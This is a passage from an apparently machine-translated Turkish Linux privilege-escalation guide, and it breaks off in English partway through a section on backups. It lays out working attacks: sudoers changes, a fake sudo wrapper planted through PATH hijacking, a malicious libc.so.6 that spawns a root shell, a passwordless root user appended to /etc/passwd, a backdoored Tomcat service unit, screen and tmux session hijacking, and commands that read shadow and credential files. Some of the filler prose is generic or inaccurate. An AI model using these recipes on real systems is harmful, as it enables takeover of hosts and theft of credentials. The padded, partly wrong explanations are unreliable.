Bu izinleri kötüye kullanmanın başka bir yolu:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

`sudo` binary's bazı alternatifleri vardır, örneğin OpenBSD için `doas` kullanılabilir, yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.

```
permit nopass demo as root cmd vim
```

### Sudo Kaçırma

Eğer bir kullanıcının genellikle bir makineye bağlandığını ve ayrıcalıkları yükseltmek için `sudo` kullandığını biliyorsanız ve bu kullanıcının bağlamında bir kabuk elde ettiyseniz, **kök olarak kodunuzu çalıştıracak yeni bir sudo yürütülebilir dosya oluşturabilirsiniz** ve ardından kullanıcının komutunu çalıştırır. Ardından, kullanıcı bağlamının $PATH'ini değiştirin (örneğin .bash\_profile'da yeni yolu ekleyin), böylece kullanıcı sudo komutunu çalıştırdığında, sudo yürütülebilir dosyanız çalıştırılır.

Kullanıcının farklı bir kabuk (bash değil) kullandığı durumlarda, yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şunu çalıştırarak:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, **yüklü yapılandırma dosyalarının nereden alındığını** belirtir. Genellikle, bu dosya aşağıdaki yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` yolundaki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin aranacağı diğer klasörlere işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib`'dir. **Bu, sistem'in kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Eğer bir kullanıcının herhangi bir nedenle yazma izinleri varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasındaki herhangi bir klasör, ayrıcalıkları yükseltebilir.\
Bu yapılandırma hatasını nasıl sömürüleceğine aşağıdaki sayfada bakın:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```

`RPATH` değişkeninde belirtildiği gibi, program tarafından `/var/tmp/flag15/` dizinine kopyalandığında, lib bu konumda kullanılacaktır.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```

Ardından, `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutuyla `/var/tmp` dizininde kötü niyetli bir kütüphane oluşturun.

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```

## Yetenekler

Linux yetenekleri, bir işleme mevcut kök ayrıcalıklarının bir **alt kümesini sağlar**. Bu, kök ayrıcalıklarını daha küçük ve ayırt edici birimlere böler. Bu birimlerden her biri ayrı ayrı işlemlere verilebilir. Bu şekilde, ayrıcalıkların tam kümesi azaltılır ve istismar riskleri azalır.\
Yetenekler hakkında daha fazla bilgi edinmek ve nasıl istismar edileceğini öğrenmek için aşağıdaki sayfayı okuyun:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Dizin izinleri

Bir dizinde, **"çalıştırma"** biti, etkilenen kullanıcının klasöre "**cd**" yapabileceği anlamına gelir.\
**"Okuma"** biti, kullanıcının **dosyaları listeleyebileceği** anlamına gelir ve **"yazma"** biti, kullanıcının **dosyaları silip ve yeni dosyalar oluşturabileceği** anlamına gelir.

## ACL'ler

Erişim Kontrol Listeleri (ACL'ler), geleneksel ugo/rwx izinlerini **geçersiz kılabilen ikincil bir ayrıcalık katmanını** temsil eder. Bu izinler, dosya veya dizin erişimini daha fazla kontrol etmek için, sahipleri veya grupta bulunmayan belirli kullanıcılara hakları kabul etme veya reddetme yeteneği sağlar. Bu **aşamalı düzey**, daha hassas erişim yönetimi sağlar. Daha fazla ayrıntıya [**buradan**](https://linuxconfig.org/how-to-manage-acls-on-linux) ulaşabilirsiniz.

Kullanıcı "kali"ye bir dosya üzerinde okuma ve yazma izni **verin**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Sistemden** belirli ACL'ye sahip dosyaları **alın**:

```bash
getfacl -R / | grep "specific_acl"
```

Bu komut, sistemde belirli bir ACL'ye sahip olan dosyaları almanıza olanak tanır. `getfacl` komutu, dosyaların ACL (Erişim Kontrol Listesi) bilgilerini almak için kullanılır. `-R` bayrağı, işlemi rekürsif olarak tüm alt dizinlere uygulamak için kullanılır. `grep` komutu, belirli bir ACL'ye sahip dosyaları filtrelemek için kullanılır. "specific\_acl" ifadesini, aradığınız belirli ACL'yi temsil edecek şekilde değiştirmeniz gerekmektedir.

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

## Açık kabuk oturumları

**Eski sürümlerde**, farklı bir kullanıcının (**root**) bazı **kabuk** oturumlarını **ele geçirebilirsiniz**.\
**En yeni sürümlerde**, yalnızca **kendi kullanıcınızın** ekran oturumlarına **bağlanabilirsiniz**. Bununla birlikte, oturum içinde **ilginç bilgiler bulabilirsiniz**.

### Ekran oturumlarını ele geçirme

**Ekran oturumlarını listele**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```

**Bir oturuma bağlanma**

Bir oturuma bağlanmak, hedef sistemdeki mevcut bir oturuma erişim sağlamak anlamına gelir. Bu, hedef sistemin kullanıcı kimlik bilgilerine sahip olmanız gerektiği anlamına gelir. Oturuma bağlanarak, hedef sistemin yetkilendirme düzeyini elde edebilir ve ayrıcalıklarınızı yükseltebilirsiniz.

Bir oturuma bağlanmak için aşağıdaki adımları izleyebilirsiniz:

1. Hedef sisteme erişim sağlayın.
2. Mevcut oturumları kontrol edin.
3. Hedef oturuma bağlanın.

**Mevcut Oturumları Kontrol Etme**

Hedef sistemin mevcut oturumlarını kontrol etmek için aşağıdaki komutları kullanabilirsiniz:

* `who` komutu, mevcut oturumları ve kullanıcıları listeler.
* `w` komutu, mevcut oturumları ve kullanıcıları ayrıntılı olarak listeler.
* `last` komutu, son oturumları ve kullanıcıları listeler.

**Hedef Oturuma Bağlanma**

Hedef oturuma bağlanmak için aşağıdaki komutları kullanabilirsiniz:

* `su` komutu, başka bir kullanıcının oturumuna geçiş yapmanızı sağlar.
* `sudo -i` komutu, root kullanıcısının oturumuna geçiş yapmanızı sağlar.
* `ssh` komutu, uzaktaki bir sistemdeki oturuma bağlanmanızı sağlar.

Oturuma başarıyla bağlandıktan sonra, hedef sistemin yetkilendirme düzeyini kontrol edebilir ve ayrıcalıklarınızı yükseltebilirsiniz.

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux oturumlarının ele geçirilmesi

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Bir ayrıcalıklı olmayan kullanıcı olarak kök tarafından oluşturulan bir tmux (v2.1) oturumunu ele geçiremedim.

**tmux oturumlarını listele**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

**Bir oturuma bağlanma**

Bir oturuma bağlanmak, hedef sistemdeki mevcut bir oturuma erişim sağlamaktır. Bu, hedef sistemin yetkilendirme düzeyini yükseltmek ve daha fazla ayrıcalık elde etmek için kullanılabilir.

Bir oturuma bağlanmak için aşağıdaki adımları izleyebilirsiniz:

1.  Hedef sistemde çalışan oturumları kontrol edin:

    ```bash
    who
    w
    ```
2. Bağlanmak istediğiniz oturumu belirleyin.
3.  Oturuma bağlanmak için aşağıdaki komutu kullanın:

    ```bash
    screen -r <session_id>
    ```

    veya

    ```bash
    tmux attach -t <session_id>
    ```

    `<session_id>` yerine hedef oturumun kimlik numarasını kullanın.

Bu adımları takip ederek hedef sisteme bağlanabilir ve oturumu ele geçirebilirsiniz. Bu, hedef sistemin ayrıcalıklarını yükseltmek ve daha fazla yetki elde etmek için kullanışlı bir yöntemdir.

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

**HTB'den Valentine kutusunu** bir örnek olarak kontrol edin.

## SSH

### Debian OpenSSL Tahmin Edilebilir PRNG - CVE-2008-0166

Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) Eylül 2006 ile 13 Mayıs 2008 tarihleri arasında oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenebilir.\
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulduğunda ortaya çıkar, çünkü **yalnızca 32.768 farklılık mümkündür**. Bu, tüm olasılıkların hesaplanabileceği anlamına gelir ve **ssh genel anahtarınızı kullanarak karşılık gelen özel anahtarı arayabilirsiniz**. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

* **PasswordAuthentication:** Parola kimlik doğrulamasının izin verilip verilmediğini belirtir. Varsayılan değer `no`'dur.
* **PubkeyAuthentication:** Genel anahtar kimlik doğrulamasının izin verilip verilmediğini belirtir. Varsayılan değer `yes`'tir.
* **PermitEmptyPasswords**: Parola kimlik doğrulamasına izin verildiğinde, sunucunun boş parola dizelerine sahip hesaplara giriş yapmasına izin verip vermediğini belirtir. Varsayılan değer `no`'dur.

### PermitRootLogin

Root'un ssh kullanarak giriş yapabilmesini belirtir, varsayılan değer `no`'dur. Mümkün değerler:

* `yes`: root, parola ve özel anahtar kullanarak giriş yapabilir
* `without-password` veya `prohibit-password`: root, yalnızca özel anahtarla giriş yapabilir
* `forced-commands-only`: Root, yalnızca özel anahtar kullanarak ve komut seçenekleri belirtilmişse giriş yapabilir
* `no` : hayır

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek genel anahtarları içeren dosyaları belirtir. `%h` gibi belirteçler içerebilir, bu belirteçler ev dizini tarafından değiştirilecektir. **Mutlak yolları** ( `/` ile başlayan) veya **kullanıcının ev dizininden başlayan göreceli yolları** belirtebilirsiniz. Örnek olarak:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Bu yapılandırma, "**testusername**" kullanıcısının **özel** anahtarıyla giriş yapmaya çalıştığınızda, ssh'nin anahtarınızın genel anahtarını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumundaki anahtarlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH ajan yönlendirmesi, sunucunuzda (parolasız!) anahtarları bırakmak yerine yerel SSH anahtarlarınızı kullanmanıza olanak tanır. Bu sayede, ssh üzerinden **bir ana bilgisayara** atlayabilir ve oradan **başka bir** ana bilgisayara **başlangıç ana bilgisayarınızdaki** anahtar kullanarak **atlayabilirsiniz**.

Bu seçeneği `$HOME/.ssh.config` dosyasında aşağıdaki gibi ayarlamanız gerekmektedir:

```
Host example.com
ForwardAgent yes
```

Eğer `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde, o makine anahtarlarına erişebilecektir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu yapılandırmayı **geçersiz kılabilir** ve bu **seçeneğe** izin verip vermemeyi belirleyebilir.\
`/etc/sshd_config` dosyası `AllowAgentForwarding` anahtar kelimesiyle ssh-agent yönlendirmesine izin verip vermediğini belirleyebilir (varsayılan olarak izin verilir).

Eğer bir ortamda Forward Agent yapılandırıldığını tespit ederseniz, ayrıcalıkları yükseltmek için bunu **kötüye kullanabilirsiniz**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## İlginç Dosyalar

### Profil Dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir kabuk çalıştırdığında **çalıştırılan betiklerdir**. Bu nedenle, bunlardan herhangi birini **yazabilir veya değiştirebilirseniz ayrıcalıkları yükseltebilirsiniz**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Eğer garip bir profil betiği bulunursa, onu **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyalarının farklı bir isim kullanması veya bir yedek olması mümkündür. Bu nedenle **hepsini bulmanız** ve içerisinde **hash'lerin olup olmadığını** görmek için **okuyup okuyamadığınızı kontrol etmeniz önerilir**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Bazı durumlarda `/etc/passwd` (veya benzeri) dosyasının içinde **parola karma değerleri** bulabilirsiniz.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir şifre oluşturun.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Ardından `hacker` kullanıcısını ekleyin ve oluşturulan şifreyi ekleyin.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` kullanıcı adı ve şifresiyle `su` komutunu kullanabilirsiniz.

Alternatif olarak, aşağıdaki satırları kullanarak şifresiz bir sahte kullanıcı ekleyebilirsiniz.\
UYARI: Bu işlem mevcut makinenin güvenliğini düşürebilir.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOT: BSD platformlarında `/etc/passwd` dosyası `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` dosyası `/etc/spwd.db` olarak yeniden adlandırılır.

Bazı **hassas dosyalara yazabilip yazamadığınızı** kontrol etmelisiniz. Örneğin, bazı **hizmet yapılandırma dosyalarına** yazabilir misiniz?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız**, aşağıdaki satırları değiştirebilirsiniz:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Arka kapınız, tomcat başlatıldığında bir sonraki sefer çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedeklemeler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız, ancak deneyin)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Garip Konum/Sahipli Dosyalar

Bu bölümde, hedef sistemin garip konumlarında veya sahip olduğu dosyalarda yapılan bir ayrıcalık yükseltme tekniği olan "Weird Location/Owned files" (Garip Konum/Sahipli Dosyalar) hakkında bilgi bulacaksınız.

Bu teknik, hedef sistemin dosya izinlerini ve sahiplik bilgilerini inceleyerek, ayrıcalık yükseltme fırsatları aramak için kullanılır. Özellikle, sistemdeki garip konumlar veya sahip olduğu dosyalar üzerinde yapılan analizler, potansiyel olarak ayrıcalık yükseltme açıklarını ortaya çıkarabilir.

Aşağıda, bu teknikle ilgili bazı önemli noktaları bulabilirsiniz:

* **Garip Konumlar**: Hedef sistemin garip veya beklenmedik konumları, ayrıcalık yükseltme fırsatları için birer ipucu olabilir. Örneğin, /tmp veya /var/tmp gibi geçici dosya dizinleri, hedef sistemin güvenlik ayarlarının zayıf olduğu yerler olabilir.
* **Sahipli Dosyalar**: Hedef sistemin sahip olduğu dosyalar, ayrıcalık yükseltme için kullanılabilecek potansiyel zayıf noktaları gösterebilir. Özellikle, root kullanıcısına ait olan dosyalar, ayrıcalık yükseltme fırsatları için değerlendirilmelidir.

Bu teknik, hedef sistemin güvenlik açıklarını tespit etmek ve ayrıcalık yükseltme fırsatlarını değerlendirmek için kullanılan etkili bir yöntemdir. Ancak, bu teknikle ilgili daha fazla bilgi ve detaylı adımlar için orijinal kaynağa başvurmanız önerilir.

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```

### Son dakikalarda değiştirilen dosyalar

Bu bölümde, son dakikalarda değiştirilen dosyaları bulmak için kullanılabilecek bazı komutlar ve teknikler bulunmaktadır. Bu bilgiler, bir saldırganın hedef sistemdeki dosyaları değiştirme veya güncelleme girişimlerini tespit etmek için kullanılabilir.

#### Komutlar

* `find / -type f -mmin -10`: Son 10 dakika içinde değiştirilen tüm dosyaları bulur.
* `find / -type f -mmin -60`: Son 1 saat içinde değiştirilen tüm dosyaları bulur.
* `find / -type f -mmin -1440`: Son 24 saat içinde değiştirilen tüm dosyaları bulur.

#### Örnek Kullanım

```bash
$ find / -type f -mmin -10
```

Bu komut, son 10 dakika içinde değiştirilen tüm dosyaları bulur ve çıktı olarak listeler.

> Not: Bu komutlar, sistemdeki tüm dosyaları tarayacağı için işlem biraz zaman alabilir.

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB dosyaları

Sqlite, hafif ve taşınabilir bir veritabanı yönetim sistemidir. Birçok uygulama, verileri saklamak için Sqlite kullanır ve bu veriler genellikle bir veya daha fazla Sqlite veritabanı dosyasında depolanır.

Sqlite veritabanı dosyaları genellikle `.db` veya `.sqlite` uzantılarına sahiptir. Bu dosyalar, yapılandırma ayarları, kullanıcı bilgileri, geçmiş verileri ve diğer uygulama verilerini içerebilir.

Sqlite veritabanı dosyaları, bir hedef sisteme erişildiğinde önemli bir hedef haline gelebilir. Bu dosyalar, hassas bilgileri içerebilir ve bir saldırganın hedef sistemi ele geçirmesine veya yetkilendirme ayrıcalıklarını yükseltmesine olanak tanıyabilir.

Sqlite veritabanı dosyalarını hedef sisteme erişerek veya bir hedef sisteme sızarak ele geçirebilirsiniz. Bu dosyaları analiz ederek, içerdikleri bilgileri keşfedebilir ve potansiyel olarak yetkilendirme ayrıcalıklarını yükseltebilirsiniz.

Sqlite veritabanı dosyalarını analiz etmek için çeşitli araçlar ve teknikler vardır. Bu araçlar ve teknikler, veritabanı yapısını incelemek, tabloları ve sütunları görüntülemek, verileri sorgulamak ve hatta veritabanı şifrelerini kırmak için kullanılabilir.

Sqlite veritabanı dosyalarını analiz etmek, bir hedef sistemin zayıf noktalarını keşfetmek ve yetkilendirme ayrıcalıklarını yükseltmek için önemli bir adımdır. Bu nedenle, bir saldırganın Sqlite veritabanı dosyalarını hedef sisteme erişerek veya bir hedef sisteme sızarak ele geçirmesi ve analiz etmesi yaygın bir saldırı yöntemidir.

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları

Bu dosyalar, bir Linux sistemde ayrıcalık yükseltme saldırıları için potansiyel hedeflerdir. Aşağıda bu dosyaların ne olduğunu ve nasıl kullanılabileceğini bulabilirsiniz:

* \*\_history: Kullanıcıların geçmiş komutlarını içeren bir dosya. Önceki komutları inceleyerek, kullanıcıların yaptığı işlemleri anlamak ve potansiyel zayıf noktaları belirlemek mümkün olabilir.
* .sudo\_as\_admin\_successful: Bu dosya, kullanıcıların başarılı bir şekilde sudo ile yönetici ayrıcalıklarını elde ettiği zaman kaydedilen bir log dosyasıdır. Bu dosya, bir saldırganın yönetici ayrıcalıklarını ele geçirmek için hedef kullanıcının kimlik bilgilerini ele geçirmesine yardımcı olabilir.
* profile ve bashrc: Bu dosyalar, kullanıcıların oturum açtıklarında çalıştırılan komutları içeren dosyalardır. Saldırganlar, bu dosyalara zararlı komutlar ekleyerek, hedef kullanıcının oturum açtığında bu komutların çalışmasını sağlayabilir.
* httpd.conf: Bu dosya, Apache HTTP Sunucusu'nun yapılandırma dosyasıdır. Saldırganlar, bu dosyayı değiştirerek, sunucunun güvenlik ayarlarını atlayabilir veya saldırılar gerçekleştirebilir.
* .plan: Bu dosya, kullanıcıların profil bilgilerini içeren bir dosyadır. Saldırganlar, bu dosyayı kullanarak hedef kullanıcının bilgilerini elde edebilir veya sosyal mühendislik saldırıları gerçekleştirebilir.
* .htpasswd: Bu dosya, Apache HTTP Sunucusu tarafından kullanılan kullanıcı adı ve şifreleri içeren bir dosyadır. Saldırganlar, bu dosyayı ele geçirerek, sunucuya yetkisiz erişim elde edebilir.
* .git-credentials: Bu dosya, Git istemcisi tarafından kullanılan kimlik bilgilerini içeren bir dosyadır. Saldırganlar, bu dosyayı ele geçirerek, Git deposuna yetkisiz erişim elde edebilir veya kimlik bilgilerini çalabilir.
* .rhosts ve hosts.equiv: Bu dosyalar, uzaktan erişim için kullanılan güvenlik ayarlarını içeren dosyalardır. Saldırganlar, bu dosyaları değiştirerek, uzaktan erişim yetkilerini elde edebilir veya saldırılar gerçekleştirebilir.
* Dockerfile ve docker-compose.yml: Bu dosyalar, Docker konteynerlerinin yapılandırma dosyalarıdır. Saldırganlar, bu dosyaları değiştirerek, konteynerlerdeki güvenlik açıklarını sömürebilir veya saldırılar gerçekleştirebilir.

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

### Gizli dosyalar

Bir Linux sistemde, gizli dosyalar adı verilen dosyalar vardır. Bu dosyalar, dosya yöneticisi veya komut satırı aracılığıyla görüntülenmezler. Gizli dosyaların adının başında bir nokta (.) bulunur. Bu dosyalar genellikle sistem yapılandırma dosyaları veya kullanıcıların kişisel tercihlerini içeren dosyalardır.

Gizli dosyaları görüntülemek için `ls -a` komutunu kullanabilirsiniz. Bu komut, tüm dosyaları, gizli dosyalar dahil olmak üzere listeler.

Gizli dosyalar, bir saldırganın sisteme erişimini artırmasına yardımcı olabilir. Saldırgan, gizli dosyalarda depolanan hassas bilgileri veya sistem yapılandırma dosyalarını hedefleyebilir. Bu nedenle, gizli dosyaların düzgün bir şekilde korunması önemlidir.

Gizli dosyaları korumak için aşağıdaki adımları izleyebilirsiniz:

1. Gizli dosyaları düzenli olarak kontrol edin ve gereksiz olanları silin.
2. Gizli dosyaların izinlerini doğru şekilde ayarlayın. Sadece gerekli kullanıcılar veya gruplar tarafından erişilebilir olmalıdır.
3. Sistem yapılandırma dosyalarını şifreleyin veya izinsiz erişime karşı koruyun.
4. Güvenlik duvarı ve güvenlik önlemleri gibi ek önlemler alarak saldırılara karşı koruma sağlayın.

Gizli dosyaların varlığını ve güvenliğini düzenli olarak kontrol etmek, sisteminizin güvenliğini artırmaya yardımcı olacaktır.

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH'te Bulunan Scriptler/Binaryler**

Bir hedef sistemde, PATH ortam değişkeninde belirtilen dizinlerde bulunan scriptler veya binaryler, bir saldırganın yetkilerini yükseltmek için kullanabileceği potansiyel hedeflerdir. Bu dizinler genellikle kullanıcıların komutları çalıştırabileceği yerlerdir ve saldırganlar, bu dizinlere zararlı bir script veya binary yerleştirerek hedef sistemi ele geçirebilirler.

Saldırganlar, PATH'te bulunan bir script veya binary'nin adını değiştirerek veya kendi zararlı script veya binary'lerini bu dizinlere ekleyerek yetkilerini yükseltebilirler. Bu şekilde, hedef sistemin bir kullanıcısı bu script veya binary'leri çalıştırdığında, saldırganın istediği işlemleri gerçekleştirebilir.

Bu nedenle, hedef sistemde PATH'te bulunan scriptler ve binaryler düzenli olarak kontrol edilmeli ve güvenlik açıkları tespit edildiğinde düzeltilmelidir.

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```

### **Web dosyaları**

Web dosyaları, bir web sunucusunda barındırılan ve web sitesinin çalışmasını sağlayan dosyalardır. Bu dosyalar, genellikle HTML, CSS, JavaScript, resimler ve diğer medya dosyalarını içerir. Web dosyaları, web sitesinin görüntülenmesi ve etkileşimli özelliklerin çalıştırılması için tarayıcılar tarafından kullanılır.

Web dosyaları, bir web sunucusunda belirli bir dizinde saklanır ve web sunucusu, istemcilerin bu dosyalara erişmesine izin verir. Bu dosyalara erişim, genellikle HTTP veya HTTPS protokolü üzerinden gerçekleştirilir.

Web dosyalarının güvenliği, web sunucusunun yapılandırmasına ve güvenlik önlemlerine bağlıdır. Bir web sunucusunun güvenliği zayıf olduğunda, saldırganlar web dosyalarına erişebilir ve kötü amaçlı faaliyetlerde bulunabilir. Bu nedenle, web sunucularının güvenliği için çeşitli önlemler alınmalıdır.

Web dosyalarının güvenliğini artırmak için aşağıdaki adımlar atılabilir:

* Web sunucusunun güvenlik duvarı yapılandırmasını kontrol etmek ve gerektiğinde güncellemek.
* Web sunucusunda çalışan yazılımların güncel sürümlerini kullanmak.
* Güçlü ve karmaşık parolalar kullanmak ve düzenli olarak değiştirmek.
* Web sunucusunda gereksiz dosyaları kaldırmak veya erişimi sınırlamak.
* Web sunucusunda güvenlik açıklarını taramak ve düzeltmek.
* Web sunucusunda güvenlik loglarını izlemek ve düzenli olarak kontrol etmek.

Bu adımlar, web dosyalarının güvenliğini artırabilir ve saldırılara karşı koruma sağlayabilir.

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Yedeklemeler**

Backups are an essential part of any system's security strategy. They serve as a safety net in case of data loss or system failure. In the context of privilege escalation, backups can be useful for several reasons:

* **Data Recovery**: If a system has been compromised and important files have been modified or deleted, having a backup can help restore the original data.
* **Configuration Analysis**: Backups can be used to analyze the system's configuration and identify any misconfigurations or vulnerabilities that may have led to the privilege escalation.
* **Forensic Analysis**: Backups can also be used for forensic analysis to understand the extent of the compromise and identify the attacker's entry point.

To ensure the effectiveness of backups, it is important to follow these best practices:

* **Regular Backups**: Perform regular backups of critical data and system configurations. The frequency of backups will depend on the importance of the data and the rate of change in the system.
